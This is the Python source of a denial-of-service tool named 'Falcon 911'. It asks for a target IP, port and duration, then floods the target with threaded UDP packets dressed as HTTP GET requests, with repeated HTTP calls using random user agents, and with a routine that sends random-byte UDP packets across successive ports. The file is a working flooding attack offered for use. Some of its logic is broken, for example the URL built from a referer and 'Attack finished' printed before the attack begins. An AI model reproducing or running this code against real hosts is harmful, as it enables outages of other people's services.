import sys
import os
import time
import socket
import random
import pyfiglet
import threading
from queue import Queue
import urllib.request
import requests
from halo import Halo
from colorama import Fore

# Colors
Z1 = '\033[95m'  # بنفسجي
Z = '\033[92m'  # Green
X = '\033[1;33m'  # أصفر
F = '\033[91m'  # أحمر
A = '\033[34m'  # أزرق
C = '\033[2;35m'  # وردي
B = '\033[36m'  # سماوي
Y = '\033[1;34m'  # أزرق
L = '\033[97m'  # أبيض
D = '\033[90m' #رمادىِ
O = '\033[3m' # خلفيه
U = '\033[4m' #مسطر

# -- Info -- #
__author__ = 'Al-Mohammady Team'
__version__ = '7.5 [ BETA ]'
__status__ = "being developed ..."
# —----——----—---——----

# Code Time
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM
)
bytes = random._urandom((10) * 1000)

def infoTool():
    spinner = Halo()
    spinner.start()
    spinner.succeed("Author  : %s." % __author__)
    spinner.succeed("Version : %s."%__version__)
    spinner.succeed("Status  : %s." % __status__)

    spinner.stop()

os.system("clear")
# Function to print gradient logo
def print_gradient_logo():
    logo = pyfiglet.figlet_format('Falcon 911', font='doh')
    gradient_colors = [
        Fore.LIGHTGREEN_EX,
        Fore.LIGHTYELLOW_EX

    ]
    for i, line in enumerate(logo.split('\n')):
        print(gradient_colors[i % len(gradient_colors)] + line)

# Print the gradient logo
print_gradient_logo()
infoTool()
print(Fore.LIGHTBLACK_EX+'\n–– FALCON Run ––\n')

host = input(f"{Fore.GREEN}[ ? ] {Fore.YELLOW}IP Target  : ")
port = int(input(f"{Fore.GREEN}[ ? ] {Fore.YELLOW}Port       : "))
attack_time = int(input(f"{Fore.GREEN}[ ? ] {Fore.YELLOW}Time       : "))
delay_time = int(input(f"{Fore.GREEN}[ ? ] {Fore.YELLOW}Delay time : "))


os.system("clear")
print_gradient_logo()
print("%sAttack Starting To IP %s%s %susing Port %s%s" % (Fore.GREEN, Fore.YELLOW, host, Fore.GREEN, Fore.YELLOW, port))
print(f'{Fore.GREEN}Attack finished after {Fore.YELLOW}{attack_time}{Fore.GREEN} seconds.\n')
spinner = Halo(text='Loading', color='red', spinner='hamburger')
spinner.start()
time.sleep(3)
spinner.stop()
sent = 0
end_time = time.time() + attack_time

# User Agent -- 

def user_agent():
    global uagent
    with open('user_agent.txt', 'r') as ug:
        uagent = [line.strip() for line in ug.readlines()]
    return uagent
    
print(random.choice(user_agent()))

def my_bots():
    global bots
    with open('referers.txt', 'r') as b:
        bots = [line.strip() for line in b.readlines()]
    return bots


#
def buildblock(size):
        out_str = ''
        for i in range(0, size):
                a = random.randint(65, 90)
                out_str += chr(a)
        return(out_str)

# ---—

def httpcall(url):
    global successHttp
    successHttp = 0
    try:
        while time.time() < end_time:
            successHttp += 1
            
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
            print(f"{Fore.YELLOW}[ {req.getcode()} ] {Fore.WHITE}HTTPCALL !{Fore.RESET}")
            
            time.sleep(.1)
    except :
        print(f'{Fore.RED}[ Error ] {Fore.MAGENTA}Error Httpcall !')
        time.sleep(.1)
    else:
        print(f'{Fore.MAGENTA}[ % ] {Fore.WHITE}HTTP Sent : {Fore.MAGENTA}{successHttp}.')

# -- Down It -- #

def down_it(item):
    global sent
    try:
        while time.time() < end_time:
            sent += 1
            packet = f"GET /?{random.randint(1000000, 1000000000)} HTTP/1.1\nHost: {host}\nUser-Agent: {random.choice(uagent)}\n\n"
            packet = packet.encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((host, int(port)))

            if s.sendto(packet, (host, int(port))):
                s.close()
                print(f'{Fore.GREEN}[ {sent} ] {Fore.YELLOW}Sent Request! Size: {Fore.GREEN}{len(packet)}.')
            else:
                s.close()
                print("\033[91mshut<->down\033[0m")
            time.sleep(.1)
    except socket.error as e:
        print("\033[91mno connection! server maybe down\033[0m")
        print(f"\033[91mSocket error: {e}\033[0m")
        time.sleep(.1)

    print(f"{Fore.MAGENTA}[ ! ]{Fore.RED} The attack is complete.")
    print(f"{Fore.MAGENTA}[ % ] {Fore.WHITE}Request Sent : {Fore.MAGENTA}{sent}.")
    sys.exit(1)

uagent = user_agent()

# Attack 1
def dos1():
    while time.time() < end_time:
        down_it(None)

    sys.exit(1)


# Attack 2
def dos2():
    #successHttp = 0
    while time.time() < end_time:
        #successHttp = 1
        httpcall(random.choice(my_bots()) + "http://" + host)


# Attack 3
def dos3():
    global sent, port
    while time.time() < end_time:
        sock.sendto(bytes, (host, port))
        sent = sent + 1
        port = port + 1
        try:
            print(f'{Z}[ {sent} ] {F}Sent To {Z}[{host}] {F}through port {Z}[ {port} ]')
            sock.shutdown(1)
        except KeyboardInterrupt:
            sys.exit(0)
        except Exception as e:
            print(f'{Z} Error: {e}')

        if port == 65534:
            port = 1

        time.sleep(delay_time)

    print(f"{Z}[!] {F}Attack time complete")
    sys.exit(1)

# -------------------------


# Run the functions in separate threads for concurrency

threading.Thread(target=dos1).start()
threading.Thread(target=dos2).start()
